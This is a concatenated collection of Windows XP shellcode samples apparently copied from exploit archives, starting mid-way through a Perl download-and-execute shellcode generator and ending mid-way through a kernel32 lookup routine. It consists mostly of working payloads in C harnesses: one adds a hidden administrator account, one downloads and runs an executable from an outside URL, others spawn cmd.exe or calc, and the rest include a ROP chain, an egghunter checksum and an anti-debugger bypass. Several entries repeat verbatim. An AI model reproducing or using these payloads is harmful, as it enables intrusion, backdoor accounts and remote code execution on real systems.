      "\x3C\x8B\x54\x05\x78\x01\xEA\x8B\x4A\x18\x8B\x5A\x20\x01\xEB".
      "\xE3\x32\x49\x8B\x34\x8B\x01\xEE\x31\xFF\xFC\x31\xC0\xAC\x38".
      "\xE0\x74\x07\xC1\xCF\x0D\x01\xC7\xEB\xF2\x3B\x7C\x24\x14\x75".
      "\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB".
      "\x8B\x04\x8B\x01\xE8\xEB\x02\x31\xC0\x5F\x5E\x5D\x5B\xC2\x08".
      "\x00\x5E\x6A\x30\x59\x64\x8B\x19\x8B\x5B\x0C\x8B\x5B\x1C\x8B".
      "\x1B\x8B\x5B\x08\x53\x68\x8E\x4E\x0E\xEC\xFF\xD6\x89\xC7\x53".
      "\x68\x8E\x4E\x0E\xEC\xFF\xD6\xEB\x50\x5A\x52\xFF\xD0\x89\xC2".
      "\x52\x52\x53\x68\xAA\xFC\x0D\x7C\xFF\xD6\x5A\xEB\x4D\x59\x51".
      "\x52\xFF\xD0\xEB\x72\x5A\xEB\x5B\x59\x6A\x00\x6A\x00\x51\x52".
      "\x6A\x00\xFF\xD0\x53\x68\xA0\xD5\xC9\x4D\xFF\xD6\x5A\x52\xFF".
      "\xD0\x53\x68\x98\xFE\x8A\x0E\xFF\xD6\xEB\x44\x59\x6A\x00\x51".
      "\xFF\xD0\x53\x68\x7E\xD8\xE2\x73\xFF\xD6\x6A\x00\xFF\xD0\xE8".
      "\xAB\xFF\xFF\xFF\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00".
      "\xE8\xAE\xFF\xFF\xFF\x55\x52\x4C\x44\x6F\x77\x6E\x6C\x6F\x61".
      "\x64\x54\x6F\x46\x69\x6C\x65\x41\x00\xE8\xA0\xFF\xFF\xFF\x2E".
      "\x2E\x5C".$c."\x00\xE8\xB7\xFF\xFF\xFF\x2E\x2E\x5C".$c."\x00".
      "\xE8\x89\xFF\xFF\xFF".$loading_url."\x00";

$sco=convert_sco($sco);
buffer_gen($sco);
print @buffer;

sub generate_char()
{
 my $wdsize = shift;
 my @alphanumeric = ('a'..'z');
 my $wd = join '',
 map $alphanumeric[rand @alphanumeric], 0..$wdsize;
  return $wd;
}

sub convert_sco {
        my $data = shift;
        my $mode = shift() || 'LE';
        my $code = '';

        my $idx = 0;

        if (length($data) % 2 != 0) {
                $data .= substr($data, -1, 1);
        }

        while ($idx < length($data) - 1) {
                my $c1 = ord(substr($data, $idx, 1));
                my $c2 = ord(substr($data, $idx+1, 1));
                if ($mode eq 'LE') {
                        $code .= sprintf('%%u%.2x%.2x', $c2, $c1);
                } else {
                        $code .= sprintf('%%u%.2x%.2x', $c1, $c2);
                }
                $idx += 2;
        }

        return $code;
}

sub buffer_gen(){
$sco = shift;
@buffer=<<FX;

    Win32 Download and Execute Shellcode Generator (browsers edition)
    Size: 275 bytes + loading_url
    Author: Yag Kohha (skyhole [at] gmail.com)
    
    Usage: ./sco http://remote_server/loader.exe
    
    Greetz to:
     str0ke \& milw0rm project
     shinnai
     h07
     rgod
     H.D. Moor \& Metaspl0it
     offtopic
     3APA3A
    
-------> Start

$sco

-------> End
FX

}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

# Title        : win32/xp sp3 (Tr) Add Admin Account Shellcode 127 bytes
# Proof        : http://img823.imageshack.us/img823/1017/addqx.jpg
# Desc.        : usr: zrl , pass: 123456 , localgroup: Administrator
# Author       : ZoRLu / http://inj3ct0r.com/author/577
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Date         : 17/09/2010
# Tesekkur     : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Lakirdi      : off ulan off  /  http://www.youtube.com/watch?v=GbyF62skA-c


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
int main(){
    
    unsigned char shellcode[]=
    "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x5d\x53\xbb\xad\x23\x86\x7c"
    "\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff"
    "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73"
    "\x65\x72\x20\x7a\x72\x6c\x20\x31\x32\x33\x34\x35\x36\x20\x2f\x61\x64"
    "\x64\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f"
    "\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73"
    "\x20\x2f\x61\x64\x64\x20\x7a\x72\x6c\x20\x26\x26\x20\x6e\x65\x74\x20"
    "\x75\x73\x65\x72\x20\x7a\x72\x6c";
 
    printf("Size = %d bytes\n", strlen(shellcode));
 
    ((void (*)())shellcode)();
    
    
 
    return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

# Title    : win32/xp sp3 (Tr) MessageBoxA Shellcode 109 bytes
# Proof    : http://img443.imageshack.us/img443/7900/proofaz.jpg
# Author   : ZoRLu
# mail-msn : admin@yildirimordulari.com
# Home     : z0rlu.blogspot.com
# Date     : 14/09/2010
# Tesekkur : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Temenni  : Yeni Anayasamiz Hayirli Olsun
# Lakirdi  : I dont know very well assembly. but, I know I will learn its too :P


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
int main(){
    
    unsigned char shellcode[]=
    "\x31\xc0\x31\xdb\x31\xd9\x31\xd2\xeb\x35\x59\x88\x51\x0a\xbb\x7b\x1d"
    "\x80\x7c\x51\xff\xd3\xeb\x37\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\x30"
    "\xae\x80\x7c\xff\xd3\xeb\x37\x59\x31\xd2\x88\x51\x07\x52\x52\x51\x52"
    "\xff\xd0\x31\xd2\x50\xb8\xfa\xca\x81\x7c\xff\xd0\xe8\xc6\xff\xff\xff"
    "\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc4\xff\xff\xff\x4d"
    "\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc4\xff\xff\xff\x69"
    "\x74\x73\x20\x6f\x6b\x21\xff";
 
    printf("Size = %d bytes\n", strlen(shellcode));
 
    ((void (*)())shellcode)();
 
    return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

# Title    : win32/xp sp3 (Tr) MessageBoxA Shellcode 109 bytes
# Proof    : http://img443.imageshack.us/img443/7900/proofaz.jpg
# Author   : ZoRLu
# mail-msn : admin@yildirimordulari.com
# Home     : z0rlu.blogspot.com
# Date     : 14/09/2010
# Tesekkur : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Temenni  : Yeni Anayasamiz Hayirli Olsun
# Lakirdi  : I dont know very well assembly. but, I know I will learn its too :P


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
int main(){
    
    unsigned char shellcode[]=
    "\x31\xc0\x31\xdb\x31\xd9\x31\xd2\xeb\x35\x59\x88\x51\x0a\xbb\x7b\x1d"
    "\x80\x7c\x51\xff\xd3\xeb\x37\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\x30"
    "\xae\x80\x7c\xff\xd3\xeb\x37\x59\x31\xd2\x88\x51\x07\x52\x52\x51\x52"
    "\xff\xd0\x31\xd2\x50\xb8\xfa\xca\x81\x7c\xff\xd0\xe8\xc6\xff\xff\xff"
    "\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc4\xff\xff\xff\x4d"
    "\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc4\xff\xff\xff\x69"
    "\x74\x73\x20\x6f\x6b\x21\xff";
 
    printf("Size = %d bytes\n", strlen(shellcode));
 
    ((void (*)())shellcode)();
 
    return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

# Title        : win32/xp sp3 (Tr) calc.exe Shellcode 53 bytes
# Proof        : http://img178.imageshack.us/img178/548/proofxw.jpg
# Author       : ZoRLu / http://inj3ct0r.com/author/577
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Date         : 15/09/2010
# Tesekkur     : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Temenni      : Yeni Anayasamiz Hayirli Olsun
# Lakirdi      : I dont know very well assembly. but, I know I will learn its too :P


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
int main(){
    
    unsigned char shellcode[]=
    "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x13\x53\xbb\xad\x23\x86\x7c"
    "\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff"
    "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61\x6c\x63\x2e\x65"
    "\x78\x65";
 
    printf("Size = %d bytes\n", strlen(shellcode));
 
    ((void (*)())shellcode)();
 
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1                 ###########################################          1
0                 I'm ZoRLu member from Inj3ct0r Team                  1
1                 ###########################################          0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

# Title        : win32/xp sp3 (Tr) cmd.exe Shellcode 42 bytes
# Proof        : http://img36.imageshack.us/img36/1183/cmdm.jpg
# Plat.        : win32 / windows
# Author       : ZoRLu / http://inj3ct0r.com/author/577
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Thanks       : http://inj3ct0r.com / http://www.exploit-db.com / http://packetstormsecurity.org / http://shell-storm.org
# Date         : 01/10/2010
# Tesekkur     : r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Lakirdi      : Okudugumuz icin Cezalandiran Sistemin amina koyim / Kpss Anani ...
# Lakirdi      : Son 31 Gun
 
 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
   
int main(){
      
    unsigned char shellcode[]=
    "\x31\xc0\xeb\x13\x5b\x88\x43\x0e\x53\xbb\xad\x23\x86\x7c\xff\xd3\xbb"
    "\xfa\xca\x81\x7c\xff\xd3\xe8\xe8\xff\xff\xff\x63\x6d\x64\x2e\x65\x78"
    "\x65\x20\x2f\x63\x20\x63\x6d\x64";
   
    printf("Size = %d bytes\n", strlen(shellcode));
   
    ((void (*)())shellcode)();
      
      
   
    return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

# Title        : win32/xp sp3 (Tr) cmd.exe Shellcode 52 bytes
# Proof        : http://img59.imageshack.us/img59/6499/proofc.png
# Author       : ZoRLu / http://inj3ct0r.com/author/577
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Date         : 15/09/2010
# Tesekkur     : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Temenni      : Yeni Anayasamiz Hayirli Olsun
# Lakirdi      : I dont know very well assembly. but, I know I will learn its too :P


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
int main(){
    
    unsigned char shellcode[]=
    "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x12\x53\xbb\xad\x23\x86\x7c"
    "\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff"
    "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x6d\x64\x2e\x65\x78"
    "\x65";
 
    printf("Size = %d bytes\n", strlen(shellcode));
 
    ((void (*)())shellcode)();
 
    return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
    Shellcode: Windows XP PRO SP3 - Full ROP calc shellcode
    Author: b33f (http://www.fuzzysecurity.com/)
    Notes: This is probably not the most efficient way but
           I gave the dll's a run for their money ;))
    Greets: Donato, Jahmel
 
    OS-DLL's used:
       Base    |    Top     |   Size     |    Version (Important!)
    ___________|____________|____________|_____________________________
    0x7c800000 | 0x7c8f6000 | 0x000f6000 | 5.1.2600.5781 [kernel32.dll]
    0x7c900000 | 0x7c9b2000 | 0x000b2000 | 5.1.2600.6055 [ntdll.dll]
    0x7e410000 | 0x7e4a1000 | 0x00091000 | 5.1.2600.5512 [USER32.dll]
 
    UINT WINAPI WinExec(            => PTR to WinExec
      __in  LPCSTR lpCmdLine,       => C:\WINDOWS\system32\calc.exe+00000000
      __in  UINT uCmdShow           => 0x1
    );
*/
 
#include <iostream>
#include "windows.h"
 
char shellcode[]=
"\xb1\x4f\x97\x7c"  // POP ECX # RETN
"\xf9\x10\x47\x7e"  // Writable PTR USER32.dll
"\x27\xfa\x87\x7c"  // POP EDX # POP EAX # RETN
"\x43\x3a\x5c\x57"  // ASCII "C:\W"
"\x49\x4e\x44\x4f"  // ASCII "INDO"
"\x04\x18\x80\x7c"  // MOV DWORD PTR DS:[ECX],EDX # MOV DWORD PTR DS:[ECX+4],EAX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x57\x53\x5c\x73"  // ASCII "WS\s"
"\x38\xd6\x46\x7e"  // MOV DWORD PTR DS:[ECX+8],EAX # POP ESI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x79\x73\x74\x65"  // ASCII "yste"
"\xcb\xbe\x45\x7e"  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x63\x61\x6c\x63"  // ASCII "calc"
"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x6d\x33\x32\x5c"  // ASCII "m32\"
"\xcb\xbe\x45\x7e"  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x2e\x65\x78\x65"  // ASCII ".exe"
"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x9e\x2e\x92\x7c"  // XOR EAX,EAX # RETN
"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
//-------------------------------------------["C:\WINDOWS\system32\calc.exe+00000000" -> ecx]-//
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x7a\xeb\xc3\x6f"  // Should result in a valid PTR in kernel32.dll
"\x4f\xda\x85\x7c"  // PUSH ESP # ADC BYTE PTR DS:[EAX+CC4837C],AL # XOR EAX,EAX # INC EAX # POP EDI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x32\xd9\x44\x7e"  // XCHG EAX,EDI # RETN
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
//-----------------------------------------------------------[Save Stack Pointer + pivot eax]-//
"\xd6\xd1\x95\x7c"  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\xf5\xd6\x91\x7c"  // XOR ECX,ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\xd6\xd1\x95\x7c"  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xb1\x4f\x97\x7c"  // POP ECX # RETN
"\xed\x2a\x86\x7c"  // WinExec()
"\xe7\xc1\x87\x7c"  // MOV DWORD PTR DS:[EAX+4],ECX # XOR EAX,EAX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Final RETN for WinExec()
"\x8a\x20\x87\x7c"; // Compensate WinExec()
//------------------------------------------------------[Write Arguments and execute -> calc]-//
 
void buff() {
    char a;
    memcpy((&a)+5, shellcode, sizeof(shellcode)); // Compiler dependent, works with Dev-C++ 4.9
}
 
int main()
{
    LoadLibrary("USER32.dll"); // we need this dll
    char buf[1024];
    buff();
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

[+] win32/xp pro sp3 (calc) 57 bytes


1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1                    ######################################            1
0                    I'm cr4wl3r  member from Inj3ct0r Team            1
1                    ######################################            0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1



[+]Discovered By: cr4wl3r
 */

#include <stdio.h>
#include <string.h>

 
int main() {
char shell[] = 	"\xb8\xff\xef\xff\xff\xf7\xd0\x2b\xe0\x55\x8b\xec"
		"\x33\xff\x57\x83\xec\x04\xc6\x45\xf8\x63\xc6\x45"
		"\xf9\x6d\xc6\x45\xfa\x64\xc6\x45\xfb\x2e\xc6\x45"
		"\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45"
		"\xf8\x50\xbb\xc7\x93\xbf\x77\xff\xd3";

printf("Shellcode lenght %d\n", strlen(shell));
getchar();
((void (*)()) shell)();
return 0;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title: win32/xp pro sp3 MessageBox shellcode 11 bytes
Author: d3c0der - d3c0der[at]hotmail[dot]com
Tested on: WinXP Pro SP3 (EN)  # ( run MessageBox that show an error message )
website : Www.AttackerZ.ir
spt : All firends ;)
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
char code[] =   "\x33\xd2\x52\x52\x52\x52\xe8\xbe\xe9\x44\x7d";
 
int main(int argc, char **argv)
{
    ((void (*)())code)();
     
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
\    ______________________WIN_SHELLCODE__________________________
/ :: win32 download & exec shellcode                              ::
\ :: by Darkeagle of Unl0ck Research Team [http://exploiterz.org] ::
/ :: to avoid 0x00 use ^^xor^^ }:>                                ::
\ :: greets goes to: Sowhat, 0x557 guys, 55k7 guys, RST/GHC guys. ::
/ ::_____________________________cya______________________________::
\
*/


#include <stdio.h>
#include <string.h>

unsigned char sh4llcode[] =
"\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03"
"\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74"
"\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E"
"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03"
"\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C"
"\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40"
"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C"
"\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC"
"\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F"
"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB"
"\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83"
"\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF"
"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF"
"http://h0nest.org/1.exe";

int main()
{

 void (*c0de)();
 printf("Win32 \"download & exec shellcode\"\n");
 *(int*)&c0de = sh4llcode;
 c0de();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;Exploit Title: Shellcode Checksum Routine
;Date: Sept 1 2010
;Author: dijital1
;Software Link:  http://www.ciphermonk.net/code/exploits/shellcode-checksum.asm
;Tested on: Omelet Hunter Shellcode in MSF
 
[BITS 32]
 
;Author: Ron Henry - dijital1
;Email: rlh@ciphermonk.net
;Site: http://www.ciphermonk.net
;Greetz to Exploit-db and Team Corelan
 
;Ok... couple of assumptions with this code. First, we're using a single
;byte as the checksum which gives us a 1 in 255 or ~0.39% chance of a
;collision.
;We consider this a worthwhile risk given the overall size of the code; 18 bytes.
 
;There are a couple ways to implement this, but a good example is how it
;was used in Peter Van Eeckhoutte's omelet egghunter mixin that was recently
;added to the Metasploit Framework.
 
;We're using a 1 byte footer at the end of the shellcode that contains the
;checksum generated at shellcode creation.
 
; Variables eax: accumulator
;           edx: points to current byte in shellcode
;           ecx: counter
 
egg_size equ 0x7a       ;we're testing 122 bytes in this instance
 
find_egg:
 
xor ecx, ecx            ;zero the counter
xor eax, eax            ;zero the accumlator
 
calc_chksum_loop:
add al, byte [edx+ecx]  ;add the byte to running total
inc ecx                 ;increment the counter
cmp cl, egg_size        ;cmp counter to egg_size
jnz calc_chksum_loop    ;if it's not equal repeat
 
test_ckksum:
cmp al, byte [edx+ecx]  ;cmp eax with 1 byte checksum
jnz find_egg            ;search for another egg if checksum is bogus



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* Shellcode Length: 39 bytes  */
/* sets PEB->BeingDebugged to 0 */
/* IsDebuggerPresent()/BeingDebugged bypass */
/* by ex-pb @ screw_you@web.de */
/* greets: xgx and all i forgot */

#include <stdio.h>
#include <windows.h>

char ShellCode[] = "\xEB"
"\x0F\x58\x80\x30\x95\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
"\xFF\xF1\x34\xA5\x95\x95\x95\xAB\x53\xD5\x97\x95\x56\x68\x61\x63\x6B\xCD";

int main()
{
	printf("Shellcode length: %d\n", strlen(ShellCode));
	return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* Shellcode Length: 39 bytes  */
/* sets PEB->BeingDebugged to 0 */
/* IsDebuggerPresent()/BeingDebugged bypass */
/* by ex-pb @ screw_you@web.de */
/* greets: xgx and all i forgot */

#include <stdio.h>
#include <windows.h>

char ShellCode[] = "\xEB"
"\x0F\x58\x80\x30\x95\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
"\xFF\xF1\x34\xA5\x95\x95\x95\xAB\x53\xD5\x97\x95\x56\x68\x61\x63\x6B\xCD";

int main()
{
	printf("Shellcode length: %d\n", strlen(ShellCode));
	return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//
// PEB way of getting kernel32 imagebase by loco.
// Compatible with all Win9x/NT based operating systems.
//
// Gives kernel32 imagebase in eax when executing.
// 29 bytes, only eax/esi used.
//
// Originally discovered by Dino Dai Zovi.
//
//

#include <stdio.h>

/*
	xor   eax, eax
	add   eax, fs:[eax+30h]
	js    method_9x

method_nt:
	mov   eax, [eax + 0ch]
	mov   esi, [eax + 1ch]
	lodsd
